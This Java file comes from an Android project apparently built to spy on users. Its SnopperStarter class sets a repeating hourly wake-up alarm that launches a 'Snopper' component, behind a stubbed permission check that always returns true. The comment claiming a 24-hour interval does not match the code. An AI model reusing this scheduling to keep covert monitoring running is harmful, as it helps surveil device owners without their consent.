package com.gameofcoding.spy.spys;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import com.gameofcoding.spy.receivers.SnopperAlarm;
import com.gameofcoding.spy.activities.SnopperStarterActivity;
import com.gameofcoding.spy.utils.XLog;

public class SnopperStarter {
    private static final String TAG = "SnopperStarter";
    private static final int SNOPPER_ALARM_ID = 10001;
    private Context mContext;

    public SnopperStarter(Context context) {
	mContext = context;
    }

    public void start() {
	if(mContext == null) {
	    XLog.e(TAG, "start(): Could not start alarm as passed 'Context' is null.");
	    return;
	}

	if(!hasAllPermissions()) {
	    XLog.d(TAG, "start(): Starting 'SnopperStarterActivity' to grant all permissions."); 
	    mContext.startActivity(new Intent(mContext, SnopperStarterActivity.class));
	    return;
	}
	
        Intent intent = new Intent(mContext, SnopperAlarm.class);

	// Check if alarm is already running
	PendingIntent preAlarm = PendingIntent.getBroadcast(mContext, SNOPPER_ALARM_ID,
							    intent, PendingIntent.FLAG_NO_CREATE);
	if(preAlarm != null) {
	    XLog.d(TAG, "Not starting SnopperAlarm (already active)");
	    return;
	}
	    
	// Set alarm that repeats after every 24 hours.
	// FIXME: 1 hr.  -> 12 hr. time
	PendingIntent pendingIntent = PendingIntent.getBroadcast(mContext, SNOPPER_ALARM_ID,
								 intent, 0);
        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
        am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(),
			(1000 * 60) * 60, pendingIntent);
    }

    public boolean hasAllPermissions() {
	// Code of this method will be in another branch
	return true;
    }
}
